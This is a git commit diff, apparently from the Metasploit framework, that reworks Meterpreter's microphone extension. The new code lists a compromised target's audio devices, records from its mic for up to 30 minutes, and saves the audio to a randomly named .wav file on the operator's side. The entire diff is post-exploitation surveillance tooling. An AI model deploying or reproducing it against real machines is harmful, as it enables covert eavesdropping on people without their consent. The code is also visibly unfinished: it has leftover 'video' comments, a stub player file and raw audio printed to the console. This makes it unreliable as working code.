fa4ebadf0f31531330c028ba40c8169323e5dae1
dmohanty-r7 <Dev_Mohanty@rapid7.com>
2017-05-10 18:43:58 -0500

    Make mic audio device stream work with mettle

--- lib/rex/post/meterpreter/extensions/stdapi/mic/mic.rb
+++ lib/rex/post/meterpreter/extensions/stdapi/mic/mic.rb
@@ -27,33 +27,59 @@ module Rex
               end
 
               def mic_list
-                response = client.send_request(Packet.create_request('stdapi_sys_audio_get_interfaces'))
+                response = client.send_request(Packet.create_request('audio_interface_list'))
                 names = []
-                response.get_tlvs(TLV_TYPE_AUDIO_INTERFACE_NAME).each do |tlv|
+                response.get_tlvs(TLV_TYPE_AUDIO_INTERFACE_FULLNAME).each do |tlv|
                   names << tlv.value
                 end
                 names
+                # response = client.send_request(Packet.create_request('webcam_list'))
+                # names = []
+                # response.get_tlvs(TLV_TYPE_WEBCAM_NAME).each do |tlv|
+                #   names << tlv.value
+                # end
+                # names
               end
 
-              # Starts streaming from audio source of index
-              def mic_start
-                request = Packet.create_request('channel_create_stdapi_net_mic_broadcast')
+              # Starts recording video from video source of index +cam+
+              def mic_start(cam)
+                request = Packet.create_request('audio_interface_start')
+                request.add_tlv(TLV_TYPE_AUDIO_INTERFACE_NAME, cam)
+                client.send_request(request)
+                true
+              end
 
+              def mic_get_frame(quality)
+                request = Packet.create_request('audio_interface_get_frame')
+                request.add_tlv(TLV_TYPE_AUDIO_DURATION, quality)
                 response = client.send_request(request)
-                channel_id = response.get_tlv_value(TLV_TYPE_CHANNEL_ID)
-
-                if(channel_id)
-                  # audio_channel = Rex::Post::Meterpreter::Channels::Pools::StreamPool.new(
-                  #     client,
-                  #     channel_id,
-                  #     "stdapi_net_mic_broadcast",
-                  #     CHANNEL_FLAG_SYNCHRONOUS
-                  # )
-                  audio_channel =  Rex::Post::Meterpreter::Channels::Pools::Audio.open(self.client)
-                end
-
-                return response, audio_channel
+                response.get_tlv(TLV_TYPE_AUDIO_DATA).value
               end
+
+              def mic_stop
+                client.send_request(Packet.create_request('audio_interface_stop'))
+                true
+              end
+
+              # # Starts streaming from audio source of index
+              # def mic_start
+              #   request = Packet.create_request('audio_interface_start')
+              #
+              #   response = client.send_request(request)
+              #   channel_id = response.get_tlv_value(TLV_TYPE_CHANNEL_ID)
+              #
+              #   if(channel_id)
+              #     # audio_channel = Rex::Post::Meterpreter::Channels::Pools::StreamPool.new(
+              #     #     client,
+              #     #     channel_id,
+              #     #     "stdapi_net_mic_broadcast",
+              #     #     CHANNEL_FLAG_SYNCHRONOUS
+              #     # )
+              #     audio_channel =  Rex::Post::Meterpreter::Channels::Pools::Audio.open(self.client)
+              #   end
+              #
+              #   return response, audio_channel
+              # end
 
               # def mic_stop
               #   client.send_request(Packet.create_request('mic_stop'))
--- lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/mic.rb
+++ lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/mic.rb
@@ -23,7 +23,7 @@ module Rex
           def commands
             {
                 'channel_create_stdapi_net_mic_broadcast' => 'Play an audio stream from the specified mic',
-                'stdapi_sys_audio_get_interfaces' => 'list all audio interfaces',
+                'stdapi_sys_audio_get_interfaces' => 'list all audio interfaces'
             }
           end
 
@@ -51,7 +51,7 @@ module Rex
             print_status("Streaming mic audio channel...")
 
             # begin
-              response, audio_channel = client.mic.mic_start
+              #response, audio_channel = client.mic.mic_start
               #mic_started = true
               # ::Timeout.timeout(10000) do
               #   while client do
@@ -63,7 +63,51 @@ module Rex
             #   client.mic.mic_stop if mic_started
             # end
 
-            print_status("Started")
+            if client.mic.mic_list.length == 0
+              print_error("Target does not have a mic")
+              return
+            end
+
+            print_status("Starting...")
+            stream_path = Rex::Text.rand_text_alpha(8) + ".wav"
+            player_path = Rex::Text.rand_text_alpha(8) + ".html"
+            duration = 1800
+            quality  = 50
+            view     = true
+            index    = 1
+
+            html = stream_path
+
+            ::File.open(player_path, 'wb') do |f|
+              f.write(html)
+            end
+            if view
+              print_status("Audio File: #{stream_path}")
+              #Rex::Compat.open_file(player_path)
+            else
+              print_status("Please open the player manually with a browser: #{player_path}")
+            end
+
+            print_status("Streaming...")
+            begin
+              client.mic.mic_start(index)
+              mic_started = true
+              ::Timeout.timeout(duration) do
+                while client do
+                  data = client.mic.mic_get_frame(quality)
+                  if data
+                    ::File.open(stream_path, 'a') do |f|
+                      f.write(data)
+                      print_status(data)
+                    end
+                    data = nil
+                  end
+                end
+              end
+            rescue ::Timeout::Error
+            ensure
+              client.mic.mic_stop if mic_started
+            end
           end
         end
       end
